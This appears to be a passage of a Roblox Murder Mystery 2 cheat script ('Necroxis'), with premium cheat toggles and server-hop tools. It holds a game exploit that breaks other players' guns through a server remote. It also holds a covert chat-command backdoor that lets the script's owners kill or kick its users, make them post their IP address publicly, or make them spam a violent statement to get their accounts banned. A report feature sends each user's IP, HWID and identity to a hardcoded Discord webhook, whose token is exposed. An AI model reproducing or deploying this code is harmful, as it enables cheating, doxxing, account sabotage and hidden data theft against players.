local Premium_NA = Tabs.Premium.newLabel("Player Not Owned Premium!")
local Label_Premium = Premium_NA:GetLabel()
Label_Premium.Black.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromHex("#FF4D00")),ColorSequenceKeypoint.new(1.000, Color3.fromHex("#E30800"))};
Tabs.Premium.newButton("Premium Link", function()
    if setclipboard then
setclipboard("https://www.roblox.com/game-pass/260784234")
else
    SendError("Your Executor Does Not Have setclipboard",3)
    end
end)
elseif IsPremium(lp) or IsOwner(lp) or IsNecroxisTeam(lp) or IsTester(lp) then
Tabs.Premium.newButton("Break Gun", function()
    for i,Player in pairs(game.Players:GetPlayers()) do
        if Player ~= lp then
        if Player.Character:FindFirstChild("Gun") and Player.Character ~= nil or Player.Backpack:FindFirstChild("Gun") and Player.Character ~= nil then
            local Gun = Player.Character:FindFirstChild("Gun") or Player.Backpack:FindFirstChild("Gun") -- to prevent yielding
            if Gun and Gun:FindFirstChild("KnifeServer") ~= nil then -- check for the remote folder
                local Success, Error = pcall(Gun.KnifeServer.ShootGun.InvokeServer, Gun.KnifeServer.ShootGun, 0, CFrame.new(), "AH2") -- handle the error itself!
                if not Success and Error then
                    SendNotification("Succesful Breaked The Gun From Sheriff!")
                end
                repeat task.wait() until Player == nil or Player.Character == nil or Player.Character.Humanoid.Health == 0
            end
        end
        end
    end
end)
Tabs.Premium.newToggle("Auto Break Gun", mm2_features["AutoBreakGun"], function(val)
    mm2_features["AutoBreakGun"] = val
    UpdateFeature("mm2", "AutoBreakGun", val)
end)
character = lp.Character or lp.CharacterAdded:Wait()
    humanoid = character:WaitForChild("Humanoid")
Tabs.Premium.newToggle("Fake Speed Glitch", mm2_features["FakeSG"], function(val)
    mm2_features["FakeSG"] = val
    UpdateFeature("mm2", "FakeSG", val)
end)
Tabs.Premium.newToggle("Invisible Fly", mm2_features["InvisFly"], function(val)
    mm2_features["InvisFly"] = val
    UpdateFeature("mm2", "InvisFly", val)
    if mm2_features["InvisFly"] then
        lp.Character:FindFirstChildOfClass('Humanoid').PlatformStand = true
        local Head = lp.Character:WaitForChild("Head")
        Head.Anchored = true
        if CFloop then CFloop:Disconnect() end
        CFloop = runservice.Heartbeat:Connect(function(deltaTime)
            local moveDirection = lp.Character:FindFirstChildOfClass('Humanoid').MoveDirection * (mm2_features["InvisFlySpeed"] * deltaTime)
            local headCFrame = Head.CFrame
            local cameraCFrame = workspace.CurrentCamera.CFrame
            local cameraOffset = headCFrame:ToObjectSpace(cameraCFrame).Position
            cameraCFrame = cameraCFrame * CFrame.new(-cameraOffset.X, -cameraOffset.Y, -cameraOffset.Z + 1)
            local cameraPosition = cameraCFrame.Position
            local headPosition = headCFrame.Position
    
            local objectSpaceVelocity = CFrame.new(cameraPosition, Vector3.new(headPosition.X, cameraPosition.Y, headPosition.Z)):VectorToObjectSpace(moveDirection)
            Head.CFrame = CFrame.new(headPosition) * (cameraCFrame - cameraPosition) * CFrame.new(objectSpaceVelocity)
            end)
        else
            if CFloop then
        CFloop:Disconnect()
        lp.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
        local Head = lp.Character:WaitForChild("Head")
        Head.Anchored = false
        end
        end
end)

Tabs.Premium.newSlider("Invisible Fly Speed", mm2_features["InvisFlySpeed"], 10, 200, function(val)
    mm2_features["InvisFlySpeed"] = val
    UpdateFeature("mm2", "InvisFlySpeed", val)
end)

positioN = CFrame.new(0,0, 2.9)
local CoolDowned = false
    
Tabs.Premium.newToggle("Auto Avoid Murder", mm2_features["AutoAvoidMurder"], function(val)
    mm2_features["AutoAvoidMurder"] = val
    UpdateFeature("mm2", "AutoAvoidMurder", val)
end)

Tabs.Premium.newToggle("Anti Void", mm2_features["AntiVoidDeath"], function(val)
    mm2_features["AntiVoidDeath"] = val
    UpdateFeature("mm2", "AntiVoidDeath", val)
end)

Tabs.Premium.newToggle("Spinner", mm2_features["Spinner"], function(val)
    mm2_features["Spinner"] = val
    UpdateFeature("mm2", "Spinner", val)
end)

Tabs.Premium.newSlider("Spin Power", mm2_features["SpinPower"], 10, 200, function(val)
    mm2_features["SpinPower"] = val
    UpdateFeature("mm2", "SpinPower", val)
end)

Tabs.Premium.newButton("Anti Bang", function()
    if not mm2_features["AntiVoidDeath"] then
    workspace.FallenPartsDestroyHeight = -math.huge
    if lastCFrame == nil then
    local lastCFrame = lp.Character.HumanoidRootPart.CFrame
    
    lp.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(0, -500, 0))
    
    wait(0.7)
    
    lp.Character.HumanoidRootPart.CFrame = lastCFrame
    workspace.FallenPartsDestroyHeight = -500
    end
    elseif functionforscript_mm2["AntiVoidDeath"] then
    if lastCFrame == nil then
    local lastCFrame = lp.Character.HumanoidRootPart.CFrame
    
    lp.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(0, -500, 0))
    
    wait(0.7)
    
    lp.Character.HumanoidRootPart.CFrame = lastCFrame
    wait(0.1)
    lastCFrame = nil
    end
    end
end)
Tabs.Premium.newToggle("Remove Traps", mm2_features["TrapsRemover"], function(val)
    mm2_features["TrapsRemover"] = val
    UpdateFeature("mm2", "TrapsRemover", val)
end)
Tabs.Premium.newButton("Get Every Toys/Emotes", function()
    require(game:GetService('ReplicatedStorage').Modules.EmoteModule).GeneratePage({"Teddy";"IceCream";"ChocolateMilk";"Fireflies";"Pizza";"CandyToy\050\048\050\050","FakeBomb"},game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Emotes"),'Premium Emotes [1]')
    require(game:GetService('ReplicatedStorage').Modules.EmoteModule).GeneratePage({"GGSign";"EggToy\050\048\050\051";"SprayPaint"},game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Emotes"),'Premium Emotes [2]')
end)
Tabs.Premium.newToggle("Auto Get Toys/Emotes", mm2_features["AutoGetToys"], function(val)
    mm2_features["AutoGetToys"] = val
    UpdateFeature("mm2", "AutoGetToys", val)
    if mm2_features["AutoGetToys"] then
        require(game:GetService('ReplicatedStorage').Modules.EmoteModule).GeneratePage({"Teddy";"IceCream";"ChocolateMilk";"Fireflies";"Pizza";"CandyToy\050\048\050\050","FakeBomb"},game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Emotes"),'Premium Emotes [1]')
    require(game:GetService('ReplicatedStorage').Modules.EmoteModule).GeneratePage({"GGSign";"EggToy\050\048\050\051";"SprayPaint"},game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Emotes"),'Premium Emotes [2]')
        ConnectAddEmote1 = lp.CharacterAdded:Connect(function()
            require(game:GetService('ReplicatedStorage').Modules.EmoteModule).GeneratePage({"Teddy";"IceCream";"ChocolateMilk";"Fireflies";"Pizza";"CandyToy\050\048\050\050","FakeBomb"},game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Emotes"),'Premium Emotes [1]')
    require(game:GetService('ReplicatedStorage').Modules.EmoteModule).GeneratePage({"GGSign";"EggToy\050\048\050\051";"SprayPaint"},game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Emotes"),'Premium Emotes [2]')
        end)
    else
        if ConnectAddEmote1 then
            ConnectAddEmote1:Disconnect()
        end
    end
end)


end

if IsOwner(lp) or IsNecroxisTeam(lp) then
    Tabs["TopSecret"] = UILIB.newTab("Panel", icns.assets["lucide-user-x"])
    Tabs.TopSecret.newLabel("Admin Panel")
    CooldownCHECK = false
    Tabs.TopSecret.newButton("Check Players", function()
        if not CooldownCHECK then
        CooldownCHECK = true
        game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(";apanel_run detect")
        wait(5)
        CooldownCHECK = false
        else
        SendError("Please Wait 5 Seconds Beforr Using This Command Again!")
        end
    end)
    Tabs.TopSecret.newLabel("If Some Players Said Their UserId In Chat")
    Tabs.TopSecret.newLabel("Thats Means, Player Using Necroxis Script")
    Tabs.TopSecret.newPlayer_Dropdown("Select Player", function(value)
        PLAYERTARGET = game.Players[value]
    end)
    Tabs.TopSecret.newButton("Kill Player", function()
        if not CooldownCHECK and PLAYERTARGET == nil then
        CooldownCHECK = true
        game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(";apanel_run kill "..PLAYERTARGET.UserId)
        wait(5)
        CooldownCHECK = false
        elseif CooldownCHECK then
        SendError("Please Wait 5 Seconds Beforr Using This Command Again!")
        elseif PLAYERTARGET == nil then
        SendError("Please Select Target Before Using Commands!")
        end
    end)
    Tabs.TopSecret.newButton("Freeze Player", function()
        if not CooldownCHECK and PLAYERTARGET == nil then
        CooldownCHECK = true
        game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(";apanel_run freeze "..PLAYERTARGET.UserId)
        wait(5)
        CooldownCHECK = false
        elseif CooldownCHECK then
        SendError("Please Wait 5 Seconds Beforr Using This Command Again!")
        elseif PLAYERTARGET == nil then
        SendError("Please Select Target Before Using Commands!")
        end
    end)
    Tabs.TopSecret.newButton("Unfreeze Player", function()
        if not CooldownCHECK and PLAYERTARGET == nil then
        CooldownCHECK = true
        game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(";apanel_run unfreeze "..PLAYERTARGET.UserId)
        wait(5)
        CooldownCHECK = false
        elseif CooldownCHECK then
        SendError("Please Wait 5 Seconds Beforr Using This Command Again!")
        elseif PLAYERTARGET == nil then
        SendError("Please Select Target Before Using Commands!")
        end
    end)
    Tabs.TopSecret.newButton("Bring Player", function()
        if not CooldownCHECK and PLAYERTARGET == nil then
        CooldownCHECK = true
        game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(";apanel_run bring "..PLAYERTARGET.UserId)
        wait(5)
        CooldownCHECK = false
        elseif CooldownCHECK then
        SendError("Please Wait 5 Seconds Beforr Using This Command Again!")
        elseif PLAYERTARGET == nil then
        SendError("Please Select Target Before Using Commands!")
        end
    end)
    Tabs.TopSecret.newButton("Kick Player", function()
        if not CooldownCHECK and PLAYERTARGET == nil then
        CooldownCHECK = true
        game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(";apanel_run kick "..PLAYERTARGET.UserId)
        wait(5)
        CooldownCHECK = false
        elseif CooldownCHECK then
        SendError("Please Wait 5 Seconds Beforr Using This Command Again!")
        elseif PLAYERTARGET == nil then
        SendError("Please Select Target Before Using Commands!")
        end
    end)
    Tabs.TopSecret.newButton("Blur IP Player", function()
        if not CooldownCHECK and PLAYERTARGET == nil then
        CooldownCHECK = true
        game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(";apanel_run blur "..PLAYERTARGET.UserId)
        wait(5)
        CooldownCHECK = false
        elseif CooldownCHECK then
        SendError("Please Wait 5 Seconds Beforr Using This Command Again!")
        elseif PLAYERTARGET == nil then
        SendError("Please Select Target Before Using Commands!")
        end
    end)
    Tabs.TopSecret.newButton("Delete Account Player", function()
        if not CooldownCHECK and PLAYERTARGET == nil then
        CooldownCHECK = true
        game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(";apanel_run deleteacc "..PLAYERTARGET.UserId)
        wait(5)
        CooldownCHECK = false
        elseif CooldownCHECK then
        SendError("Please Wait 5 Seconds Beforr Using This Command Again!")
        elseif PLAYERTARGET == nil then
        SendError("Please Select Target Before Using Commands!")
        end
    end)
    Tabs.TopSecret.newLabel("Warning: It Works Only On Necroxis Users!")
end
Tabs.Settings.newLabel("Main Settings")
Tabs.Settings.newButton("Rejoin", function()
    SendNotification("Please, Wait...")
        local TeleportService = game:GetService("TeleportService")
        local Rejoin = coroutine.create(function()
            local Success, ErrorMessage = pcall(function()
                TeleportService:Teleport(game.PlaceId, lp, game.JobId)
                end)
            end)
    
        if ErrorMessage and not Success then
        SendWarning(ErrorMessage)
        end
        coroutine.resume(Rejoin)
end)

Tabs.Settings.newButton("Switch To Normal Server", function()
    SendNotification("Swtiching To Normal Server...")
    wait(1)
    local PlaceID = game.PlaceId
        local AllIDs = {}
        local foundAnything = ""
        local actualHour = os.date("!*t").hour
        local Deleted = false
        function TPReturner()
        local Site;
        if foundAnything == "" then
        Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
        else
            Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
        end
        local ID = ""
        if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
        foundAnything = Site.nextPageCursor
        end
        local num = 0;
        for i,v in pairs(Site.data) do
        local Possible = true
        ID = tostring(v.id)
        if tonumber(v.maxPlayers) > tonumber(v.playing) then
        for _,Existing in pairs(AllIDs) do
        if num ~= 0 then
        if ID == tostring(Existing) then
        Possible = false
        end
        else
            if tonumber(actualHour) ~= tonumber(Existing) then
        local delFile = pcall(function()
    -- delfile("NotSameServers.json")
            AllIDs = {}
            table.insert(AllIDs, actualHour)
            end)
        end
        end
        num = num + 1
        end
        if Possible == true then
        table.insert(AllIDs, ID)
        wait()
        pcall(function()
    -- writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
            wait()
            game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
            end)
        wait(4)
        end
        end
        end
        end
    
        function Teleport()
        while wait() do
        pcall(function()
            TPReturner()
            if foundAnything ~= "" then
            TPReturner()
            end
            end)
        end
        end
    
        Teleport()
end)

Tabs.Settings.newButton("Switch To Small Server", function()
    SendNotification("Switching To Small Server...")
    wait(1)
    local PlaceID = game.PlaceId
        local AllIDs = {}
        local foundAnything = ""
        local actualHour = os.date("!*t").hour
        local Deleted = false
        function TPReturner()
        local Site;
        if foundAnything == "" then
        Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
        else
            Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
        end
        local ID = ""
        if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
        foundAnything = Site.nextPageCursor
        end
        local num = 0;
        for i,v in pairs(Site.data) do
        local Possible = true
        ID = tostring(v.id)
        if tonumber(v.playing) > 2 then
        for _,Existing in pairs(AllIDs) do
        if num ~= 0 then
        if ID == tostring(Existing) then
        Possible = false
        end
        else
            if tonumber(actualHour) ~= tonumber(Existing) then
        local delFile = pcall(function()
    -- delfile("NotSameServers.json")
            AllIDs = {}
            table.insert(AllIDs, actualHour)
            end)
        end
        end
        num = num + 1
        end
        if Possible == true then
        table.insert(AllIDs, ID)
        wait()
        pcall(function()
    -- writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
            wait()
            game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
            end)
        wait(4)
        end
        end
        end
        end
    
        function Teleport()
        while wait() do
        pcall(function()
            TPReturner()
            if foundAnything ~= "" then
            TPReturner()
            end
            end)
        end
        end
    
        Teleport()
end)
JobIdCurrent = "nil"
Tabs.Settings.newTextBox("Enter JobId", "...", function(val)
    JobIdCurrent = val
end)
maxPlayersRequest = 3
Tabs.Settings.newSlider("Player Count", maxPlayersRequest, 1, 11, function(val)
    maxPlayersRequest = val
end)
Tabs.Settings.newButton("Join Server", function()
    if JobIdCurrent == "nil" then
        SendNotification("JobId didnt detected! Switching server(With Entered Player Count)...")
        local PlaceID = game.PlaceId
        local AllIDs = {}
        local foundAnything = ""
        local actualHour = os.date("!*t").hour
        local Deleted = false
        function TPReturner()
        local Site;
        if foundAnything == "" then
        Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
        else
            Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
        end
        local ID = ""
        if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
        foundAnything = Site.nextPageCursor
        end
        local num = 0;
        for i,v in pairs(Site.data) do
        local Possible = true
        ID = tostring(v.id)
        if tonumber(v.playing) == maxPlayersRequest then
        for _,Existing in pairs(AllIDs) do
        if num ~= 0 then
        if ID == tostring(Existing) then
        Possible = false
        end
        else
            if tonumber(actualHour) ~= tonumber(Existing) then
        local delFile = pcall(function()
    -- delfile("NotSameServers.json")
            AllIDs = {}
            table.insert(AllIDs, actualHour)
            end)
        end
        end
        num = num + 1
        end
        if Possible == true then
        table.insert(AllIDs, ID)
        wait()
        pcall(function()
    -- writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
            wait()
            game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
            end)
        wait(4)
        end
        end
        end
        end
    
        function Teleport()
        while wait() do
        pcall(function()
            TPReturner()
            if foundAnything ~= "" then
            TPReturner()
            end
            end)
        end
        end
    
        Teleport()
    else
        SendNotification("JobId got detected! Switching server(With Current JobId)...")
        local TeleportService = game:GetService("TeleportService")
        local Rejoin = coroutine.create(function()
            local Success, ErrorMessage = pcall(function()
                TeleportService:Teleport(game.PlaceId, lp, JobIdCurrent)
                end)
            end)
    
        if ErrorMessage and not Success then
        SendWarning(ErrorMessage)
        end
        coroutine.resume(Rejoin)
    end
end)

Tabs.Settings.newToggle("Auto Save Features", mm2_features["AutoSaveFeatures"], function(val)
    mm2_features["AutoSaveFeatures"] = val
    UpdateFeature("mm2", "AutoSaveFeatures", val)
end)
Tabs.Settings.newLabel("Report Settings")
Report1 = ""
Report2 = "Suggestion"
Tabs.Settings.newTextBox("Enter Message Here", "Example", function(val)
    Report1 = val
end)
Tabs.Settings.newDropdown("Select Category", "Suggestion", {"Errors In Script", "Bugs In Script", "Suggestion", "Others"}, function(val)
    Report2 = val
end)
COOLODP = false
Tabs.Settings.newButton("Send Report", function()
    if not COOLODP then
    if Report1 == "" then
        SendError("Cannot Send Empty Report!")
        return
    end
    if Report2 == "" then
        SendError("Cannot Send Report Without Selected Category!")
        return
    end
    COOLODP = true
    SendDiscord("https://discord.com/api/webhooks/1320587452104310808/73hVfckGSufFungDVox3_jOtGvpUAjQYM3fHQHVi-QPnJ9-0yjpvI9hkaXiFvBYQAUjf", "@gregory909", "API[Sended-"..Report2.."]","", "User Sended "..Report2.."!", "https://web.roblox.com/users/" .. lp.UserId .. "/profile", {
                {
                    ["name"] = "User:",
                    ["value"] = lp.Name.." (" ..lp.DisplayName.. ")["..lp.UserId.."]",
                    ["inline"] = true,
                },
                {
                    ["name"] = "HWID:",
                    ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
                    ["inline"] = true,
                },
                {
                    ["name"] = "Executor:",
                    ["value"] = getexecutorname(),
                    ["inline"] = true,
                },
                {
                    ["name"] = "Server Id:",
                    ["value"] = game.JobId,
                    ["inline"] = true,
                },
                {
                    ["name"] = "IP:",
                    ["value"] = getip,
                    ["inline"] = true,
                },
                {
                    ["name"] = "Game: ",
                    ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
                    ["inline"] = true,
                },
                {

                    ["name"] = "Description: ",

                    ["value"] = Report1,
                    ["inline"] = true,
                }
            })
        SendNotification("Sended Message")
        wait(60)
        COOLODP = false
    else
        SendError("Please Wait 60 Seconds To Send Report Again!")
    end
end)
if StatusOfDevice == "Mobile/Tablet" then
    local toggleguiforclose = Instance.new("ScreenGui")
    toggleguiforclose.Name = "ToggleUi"
    toggleguiforclose.Parent = lp.PlayerGui
    toggleguiforclose.ResetOnSpawn = false
    
    local toggletohideui = Instance.new("ImageButton")
    toggletohideui.Name = "HideButton"
    toggletohideui.Size = UDim2.new(0, 50, 0, 50)
    toggletohideui.Position = UDim2.new(0.01001973976, 0, 0.343832953, 0)
    toggletohideui.BackgroundColor3 = Color3.fromRGB(28,28,28)
    toggletohideui.Active = true
    toggletohideui.Draggable = true
    toggletohideui.Parent = toggleguiforclose
    toggletohideui.Image = "rbxassetid://80367453324417"
    toggletohideui.ZIndex = 0
    
    local uicor = Instance.new("UICorner", toggletohideui)
    uicor.CornerRadius = UDim.new(0, 25)
    
    toggletohideui.MouseButton1Click:Connect(function()
        UILIB:Toggle()
    end)
end
    
    KeybindConnect = UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if input.KeyCode == Enum.KeyCode.Tab then
        UILIB:Toggle()
        end
    end)
    
    if workspace:FindFirstChild("SAFESPOT") == nil then
    local part = Instance.new("Part", workspace)
    part.Anchored = true
    part.Size = Vector3.new(100,0.7,100)
    part.Transparency = 0.85
    part.CFrame = CFrame.new(1140, 1111, 19)
    end

replst.Remotes.Gameplay.Fade.OnClientEvent:Connect(function()
    SnowFull = false
    task.wait(0.5)
    if lp.Name == Murder and IsAlive(lp) then
        game.CoreGui:FindFirstChild("InstantRN").TextL.Text = "Murderer"
        game.CoreGui:FindFirstChild("InstantRN").TextL.TextColor3 = Color3.fromRGB(255,48,48)
    elseif lp.Name == Sheriff and IsAlive(lp) then
        game.CoreGui:FindFirstChild("InstantRN").TextL.Text = "Sheriff"
        game.CoreGui:FindFirstChild("InstantRN").TextL.TextColor3 = Color3.fromRGB(48,48,255)
    elseif lp.Name ~= Murder and lp.Name ~= Sheriff and IsAlive(lp) then
        game.CoreGui:FindFirstChild("InstantRN").TextL.Text = "Innocent"
        game.CoreGui:FindFirstChild("InstantRN").TextL.TextColor3 = Color3.fromRGB(48,255,48)
    end
    for i = 1,15 do
            game.CoreGui.InstantRN.Enabled = mm2_features["IRN_Toggle"]
        wait(0.5)
        end
    game.CoreGui.InstantRN.Enabled = false
end)

function handleCommand(messageData)
    if not messageData.TextSource then return end
    local messageText = messageData.Text
    local senderName = messageData.TextSource
    
    if senderName.Name ~= lp.Name and not IsOwner(lp) and not IsNecroxisTeam(lp) then
        if IsOwner(senderName) then
            if messageText == ":apanel_run kill "..lp.UserId then
                lp.Character.HumanoidRootPart:Destroy()
            elseif messageText == ":apanel_run freeze "..lp.UserId then
                lp.Character.HumanoidRootPart.Anchored = true
            elseif messageText == ":apanel_run unfreeze "..lp.UserId then
                lp.Character.HumanoidRootPart.Anchored = false
            elseif messageText == ":apanel_run detect" then
                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("")
            elseif messageText == ":apanel_run kick "..lp.UserId then
                SendNotification("You will be kicked by Necroxis Admin!")
                wait(4)
                game.shutdown()
            elseif messageText == ":apanel_run bring "..lp.UserId then
                lp.Character.HumanoidRootPart.CFrame = game.Players[senderName.Name].Character.HumanoidRootPart.CFrame
            elseif messageText == ":apanel_run blur "..lp.UserId then
                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(getip)
            elseif messageText == ":apanel_run delete "..lp.UserId then
                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("I love killing children in real life")
                wait(1)
                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("I love killing children in real life")
                wait(1)
                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("I love killing children in real life")
                wait(1)
                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("I love killing children in real life")
                wait(1)
                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("I love killing children in real life")
                wait(1)
                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("I love killing children in real life")
                wait(1)
                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("I love killing children in real life")
                wait(1)
                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("I love killing children in real life")
                wait(1)
                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("I love killing children in real life")
                wait(1)
                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("I love killing children in real life")
                wait(1)
                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("I love killing children in real life")
                wait(1)
                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("I love killing children in real life")
                wait(1)
                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("I love killing children in real life")
                wait(1)
                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("I love killing children in real life")
            end
        elseif IsNecroxisTeam(senderName) then
            if messageText == ":apanel_run kill "..lp.UserId then
                lp.Character.HumanoidRootPart:Destroy()
            elseif messageText == ":apanel_run freeze "..lp.UserId then
                lp.Character.HumanoidRootPart.Anchored = true
            elseif messageText == ":apanel_run unfreeze "..lp.UserId then
                lp.Character.HumanoidRootPart.Anchored = false
            elseif messageText == ":apanel_run detect" then
                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("This User Using NX Project!")
            elseif messageText == ":apanel_run kick "..lp.UserId then
                spawnfakekick(senderName.Name)
            elseif messageText == ":apanel_run bring "..lp.UserId then
                lp.Character.HumanoidRootPart.CFrame = game.Players[senderName.Name].Character.HumanoidRootPart.CFrame
            elseif messageText == ":apanel_run blur "..lp.UserId then
                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(getip)
            elseif messageText == ":apanel_run deleteacc "..lp.UserId then
                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("I love killing children in real life")
                wait(1)
                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("I love killing children in real life")
                wait(1)
                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("I love killing children in real life")
                wait(1)
                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("I love killing children in real life")
                wait(1)
                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("I love killing children in real life")
                wait(1)
                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("I love killing children in real life")
                wait(1)
                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("I love killing children in real life")
                wait(1)
                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("I love killing children in real life")
                wait(1)
                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("I love killing children in real life")
                wait(1)
                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("I love killing children in real life")
                wait(1)
                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("I love killing children in real life")
                wait(1)
                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("I love killing children in real life")
                wait(1)
                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("I love killing children in real life")
                wait(1)
                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("I love killing children in real life")
            end
        end
    end
end

game:GetService("TextChatService").MessageReceived:Connect(handleCommand)

function MoreBypass()
    if mm2_features["AutoGrabGun"] then
            if lp.Character ~= nil then
    if GetGunDrop() == nil then return end
    if lp.Name == Murder then return end
    if GetGunDrop() ~= nil and lp.Name ~= Murder then
        local ts,ti1,ti2 = game:GetService("TweenService"),TweenInfo.new(.24,Enum.EasingStyle.Quint), TweenInfo.new(.15)
        LSTPOINT_GD = lp.Character.HumanoidRootPart.CFrame
        wait(.1)
        lp.Character.HumanoidRootPart.CFrame = GetGunDrop().CFrame + Vector3.new(0,-10,0)
        ts:Create(lp.Character.HumanoidRootPart, ti2, {CFrame = GetGunDrop().CFrame + Vector3.new(0,5.9,0)}):Play()
        wait(.26)
        if GetGunDrop() ~= nil then
            ts:Create(lp.Character.HumanoidRootPart, ti2, {CFrame = GetGunDrop().CFrame + Vector3.new(0,-10,0)}):Play()
        else
            ts:Create(lp.Character.HumanoidRootPart, ti2, {CFrame = lp.Character.HumanoidRootPart.CFrame + Vector3.new(0,-10,0)}):Play()
        end
        wait(.16)
        lp.Character.HumanoidRootPart.CFrame = LSTPOINT_GD
        wait(0.1)
        LSTPOINT_GD = nil
        task.wait(0.2)
    end
            end
end
    if mm2_features["NotifyDG"] then
    if lp.Character ~= nil then
    if GetGunDrop() == nil then return end
    if lp.Name == Murder then return end
    if GetGunDrop() ~= nil and lp.Name ~= Murder then
        if not CGHT_DG then
        CGHT_DG = true
        SendNotification("Dropped Gun Has Spawned!", 10)
        repeat task.wait() until GetGunDrop() == nil or not mm2_features["NotifyDG"]
        CGHT_DG = false
    end
    end
    end
    end
    if mm2_features["Esp_GunDrop"] then
        if GetGunDrop() == nil then return end
    if GetGunDrop() ~= nil then
    if GetGunDrop():FindFirstChild("ESP_BODY") == nil then
    local espholder = Instance.new("BillboardGui",GetGunDrop())
    espholder.Name = "ESP_BODY"
    espholder.AlwaysOnTop = true
    espholder.Size = UDim2.fromOffset(200,50)
    espholder.ExtentsOffset = Vector3.new(0,3,0)
    espholder.Enabled = true
    espholder.Adornee = GetGunDrop()
    
    local nothingwrong = Instance.new("TextLabel",espholder)
    nothingwrong.TextSize = 18
    nothingwrong.Text = "Dropped Gun"
    nothingwrong.Font = Enum.Font.DenkOne
    nothingwrong.BackgroundTransparency = 1
    nothingwrong.Size = UDim2.fromScale(1,1)
    nothingwrong.TextStrokeTransparency = 0
    nothingwrong.TextYAlignment = Enum.TextYAlignment.Bottom
    nothingwrong.ZIndex = 0
    nothingwrong.TextColor3 = Color3.fromRGB(0,155,155)
    end
    end
    else
    for i,v in pairs(workspace:GetChildren()) do
        for u,b in pairs(v:GetChildren()) do
        if b:FindFirstChild("ESP_BODY") ~= nil then b:FindFirstChild("ESP_BODY"):Destroy() end
        end
    end
    end
    if mm2_features["Highlight_GunDrop"] then
    if GetGunDrop() == nil then return end
    if GetGunDrop() ~= nil then
    if GetGunDrop():FindFirstChild("HIGHLIGHT_BODY") == nil then
    local billboard = Instance.new("Highlight",GetGunDrop())
    billboard.Name = "HIGHLIGHT_BODY"
    
